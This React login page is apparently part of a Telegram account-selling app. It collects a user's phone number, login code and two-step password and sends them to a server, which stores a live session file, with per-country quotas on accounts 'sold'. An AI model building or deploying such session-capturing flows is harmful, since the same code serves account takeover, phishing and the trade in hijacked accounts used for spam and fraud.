"use client"

import type React from "react"

import { useState, useEffect } from "react"

interface LoginPageProps {
  onLogin: () => void
  onBack: () => void
}

export default function LoginPage({ onLogin, onBack }: LoginPageProps) {
  const [countryCode, setCountryCode] = useState("+1")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [otp, setOtp] = useState("")
  const [step, setStep] = useState<"phone" | "otp" | "2fa">("phone")
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [phoneCodeHash, setPhoneCodeHash] = useState("")
  const [initialSessionString, setInitialSessionString] = useState("") // Session from sendOTP
  const [sessionString, setSessionString] = useState("") // Session after OTP verification
  const [password2FA, setPassword2FA] = useState("")
  const [countries, setCountries] = useState<any[]>([])
  const [selectedCountry, setSelectedCountry] = useState<any>(null)

  const handleContinue = async () => {
    if (!phoneNumber.trim()) {
      setError("Please enter a phone number")
      return
    }

    setLoading(true)
    setError("")

    try {
      const fullPhoneNumber = countryCode + phoneNumber
      
      // Check country capacity first
      const capacityResponse = await fetch('/api/countries/check-capacity', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ countryCode: selectedCountry?.country_code || countryCode.replace('+', '') })
      })

      if (!capacityResponse.ok) {
        const capacityData = await capacityResponse.json()
        setError(capacityData.error || 'Failed to check capacity')
        setLoading(false)
        return
      }

      const capacityData = await capacityResponse.json()
      
      if (!capacityData.available) {
        setError(`❌ Capacity full for ${selectedCountry?.country_name || 'this country'}. No more accounts can be sold.`)
        setLoading(false)
        return
      }

      // Send OTP via Telegram API
      const response = await fetch('/api/telegram/auth/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: fullPhoneNumber, countryCode: selectedCountry?.country_code || countryCode.replace('+', '') })
      })

      // Check if response is ok
      if (!response.ok) {
        const text = await response.text()
        console.error('[LoginPage] Server error:', text)
        setError(`Server error: ${response.status}`)
        setLoading(false)
        return
      }

      // Parse JSON with error handling
      let data
      try {
        const text = await response.text()
        data = text ? JSON.parse(text) : {}
      } catch (jsonError) {
        console.error('[LoginPage] JSON parse error:', jsonError)
        setError('Invalid response from server. Please try again.')
        setLoading(false)
        return
      }

      if (data.success) {
        setPhoneCodeHash(data.phoneCodeHash)
        setInitialSessionString(data.sessionString) // Store session for verification step
        setStep("otp")
        setError("")
      } else {
        setError(data.error || 'Failed to send OTP')
      }
    } catch (err: any) {
      console.error('[LoginPage] Error:', err)
      setError(err.message || 'Network error')
    } finally {
      setLoading(false)
    }
  }

  // Load countries on mount
  const loadCountries = async () => {
    try {
      const response = await fetch('/api/countries')
      if (response.ok) {
        const data = await response.json()
        if (data.success && data.countries) {
          setCountries(data.countries)
          // Set default to first country
          if (data.countries.length > 0) {
            setSelectedCountry(data.countries[0])
            setCountryCode(data.countries[0].country_code)
          }
        }
      }
    } catch (error) {
      console.error('Error loading countries:', error)
    }
  }

  // Call loadCountries on mount
  useEffect(() => {
    loadCountries()
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  const handleVerifyOtp = async () => {
    if (otp.length !== 5) {
      setError("Please enter the complete OTP")
      return
    }

    setLoading(true)
    setError("")

    try {
      // Get Telegram user ID
      const tg = (window as any).Telegram?.WebApp
      const telegramUser = tg?.initDataUnsafe?.user
      
      // Verify OTP and create session
      const response = await fetch('/api/telegram/auth/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber,
          phoneCodeHash,
          otpCode: otp,
          sessionString: initialSessionString, // Pass the session from sendOTP
          telegramId: telegramUser?.id // Pass telegram ID to create account record
        })
      })

      // Check if response is ok
      if (!response.ok) {
        const text = await response.text()
        console.error('[LoginPage] Server error:', text)
        setError(`Server error: ${response.status}`)
        setLoading(false)
        return
      }

      // Parse JSON with error handling
      let data
      try {
        const text = await response.text()
        data = text ? JSON.parse(text) : {}
      } catch (jsonError) {
        console.error('[LoginPage] JSON parse error:', jsonError)
        setError('Invalid response from server. Please try again.')
        setLoading(false)
        return
      }

      if (data.success) {
        // Session created successfully (no 2FA required)
        alert('✅ Session created successfully!\nFile saved on server.\nUser added to pending list.')
        onLogin()
      } else if (data.requires2FA) {
        // 2FA required
        setSessionString(data.sessionString || '') // Save session for 2FA step
        setStep("2fa")
        setError("")
      } else {
        setError(data.error || 'Failed to verify OTP')
      }
    } catch (err: any) {
      console.error('[LoginPage] Error:', err)
      setError(err.message || 'Network error')
    } finally {
      setLoading(false)
    }
  }

  const handleVerify2FA = async () => {
    if (!password2FA.trim()) {
      setError("Please enter your 2FA password")
      return
    }

    setLoading(true)
    setError("")

    try {
      // Get Telegram user ID
      const tg = (window as any).Telegram?.WebApp
      const telegramUser = tg?.initDataUnsafe?.user
      
      const response = await fetch('/api/telegram/auth/verify-2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber,
          sessionString,
          password: password2FA,
          telegramId: telegramUser?.id // Pass telegram ID to create account record
        })
      })

      // Check if response is ok
      if (!response.ok) {
        const text = await response.text()
        console.error('[LoginPage] Server error:', text)
        setError(`Server error: ${response.status}`)
        setLoading(false)
        return
      }

      // Parse JSON with error handling
      let data
      try {
        const text = await response.text()
        data = text ? JSON.parse(text) : {}
      } catch (jsonError) {
        console.error('[LoginPage] JSON parse error:', jsonError)
        setError('Invalid response from server. Please try again.')
        setLoading(false)
        return
      }

      if (data.success) {
        alert('✅ Session created successfully with 2FA!\nFile saved on server.\nUser added to pending list.')
        onLogin()
      } else {
        setError(data.error || 'Invalid password')
      }
    } catch (err: any) {
      console.error('[LoginPage] Error:', err)
      setError(err.message || 'Network error')
    } finally {
      setLoading(false)
    }
  }

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return

    const newOtp = otp.split("")
    newOtp[index] = value
    setOtp(newOtp.join(""))

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`)
      nextInput?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`)
      prevInput?.focus()
    }
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Login Form */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-8">
        {step === "phone" ? (
          <>
            <h2 className="text-[28px] font-bold text-gray-900 mb-2">Login Account</h2>
            <p className="text-gray-400 text-center mb-16 text-[14px]">Please enter your account phone number</p>

            {/* Phone Input with Country Code */}
            <div className="w-full max-w-md mb-auto space-y-3">
              {/* Country Code Selector */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Select Country</label>
                <select
                  value={countryCode}
                  onChange={(e) => {
                    const code = e.target.value
                    setCountryCode(code)
                    const country = countries.find(c => c.country_code === code)
                    setSelectedCountry(country)
                  }}
                  className="w-full px-4 py-3.5 border-2 border-blue-500 rounded-[18px] text-[14px] text-gray-700 focus:outline-none focus:border-blue-600 transition-colors bg-white"
                >
                  {countries.length > 0 ? (
                    countries.map((country) => (
                      <option key={country.country_code} value={country.country_code}>
                        {country.country_name} (+{country.country_code}) - {country.max_capacity - country.used_capacity} available
                      </option>
                    ))
                  ) : (
                    <>
                      <option value="+1">United States (+1)</option>
                      <option value="+44">United Kingdom (+44)</option>
                      <option value="+91">India (+91)</option>
                      <option value="+92">Pakistan (+92)</option>
                      <option value="+880">Bangladesh (+880)</option>
                      <option value="+86">China (+86)</option>
                    </>
                  )}
                </select>
              </div>

              {/* Phone Number Input */}
              <div className="flex gap-2">
                <div className="w-20 px-3 py-3.5 border-2 border-blue-500 rounded-[18px] text-[14px] text-gray-700 font-semibold bg-gray-50 flex items-center justify-center">
                  +{countryCode.replace('+', '')}
                </div>
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value.replace(/[^0-9]/g, ''))}
                  placeholder="Phone number (without country code)"
                  className="flex-1 px-4 py-3.5 border-2 border-blue-500 rounded-[18px] text-[14px] text-gray-700 placeholder-gray-400 focus:outline-none focus:border-blue-600 transition-colors"
                />
              </div>
              
              {/* Capacity Info */}
              {selectedCountry && (
                <div className="text-xs text-gray-600 mt-1">
                  Capacity: {selectedCountry.used_capacity}/{selectedCountry.max_capacity} used
                  {selectedCountry.max_capacity - selectedCountry.used_capacity === 0 && (
                    <span className="text-red-600 font-semibold ml-2">⚠️ FULL</span>
                  )}
                </div>
              )}
            </div>

            {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

            {/* Continue Button */}
            <div className="fixed bottom-0 left-0 right-0 px-6 pb-8">
              <button
                onClick={handleContinue}
                disabled={loading}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3.5 rounded-full font-medium text-[15px] hover:from-blue-600 hover:to-blue-700 disabled:opacity-50 shadow-md transition-all"
              >
                {loading ? "Sending OTP..." : "Continue"}
              </button>
            </div>
          </>
        ) : step === "otp" ? (
          <>
            <h2 className="text-[28px] font-bold text-gray-900 mb-2">Verify OTP</h2>
            <p className="text-gray-400 text-center mb-1 text-[14px]">Enter the OTP sent to</p>
            <p className="text-gray-700 text-center mb-16 font-semibold text-[14px]">+{countryCode.replace('+', '')} {phoneNumber}</p>

            {/* OTP Input */}
            <div className="w-full max-w-md mb-auto">
              <div className="flex gap-2.5 justify-center">
                {[0, 1, 2, 3, 4].map((index) => (
                  <input
                    key={index}
                    id={`otp-${index}`}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={otp[index] || ""}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    className="w-11 h-12 border-2 border-blue-500 rounded-[14px] text-center text-[18px] font-semibold text-gray-900 focus:outline-none focus:border-blue-600 transition-colors"
                  />
                ))}
              </div>
              <p className="text-xs text-gray-500 text-center mt-3">Check your Telegram app for the code</p>
            </div>

            {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

            {/* Verify Button */}
            <div className="fixed bottom-0 left-0 right-0 px-6 pb-8">
              <button
                onClick={handleVerifyOtp}
                disabled={loading || otp.length !== 5}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3.5 rounded-full font-medium text-[15px] hover:from-blue-600 hover:to-blue-700 disabled:opacity-50 shadow-md transition-all mb-3"
              >
                {loading ? "Verifying..." : "Verify OTP"}
              </button>

              {/* Change Phone Number */}
              <button
                onClick={() => {
                  setStep("phone")
                  setOtp("")
                  setError("")
                }}
                className="w-full text-blue-500 text-[14px] hover:text-blue-600 font-normal"
              >
                Change phone number
              </button>
            </div>
          </>
        ) : (
          <>
            {/* 2FA Password Step */}
            <h2 className="text-[28px] font-bold text-gray-900 mb-2">Two-Factor Authentication</h2>
            <p className="text-gray-400 text-center mb-16 text-[14px]">Enter your Telegram password</p>

            {/* Password Input */}
            <div className="w-full max-w-md mb-auto">
              <input
                type="password"
                value={password2FA}
                onChange={(e) => setPassword2FA(e.target.value)}
                placeholder="Password"
                className="w-full px-4 py-3.5 border-2 border-blue-500 rounded-[18px] text-[14px] text-gray-700 placeholder-gray-400 focus:outline-none focus:border-blue-600 transition-colors"
              />
            </div>

            {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

            {/* Verify Button */}
            <div className="fixed bottom-0 left-0 right-0 px-6 pb-8">
              <button
                onClick={handleVerify2FA}
                disabled={loading}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3.5 rounded-full font-medium text-[15px] hover:from-blue-600 hover:to-blue-700 disabled:opacity-50 shadow-md transition-all"
              >
                {loading ? "Verifying..." : "Continue"}
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  )
}
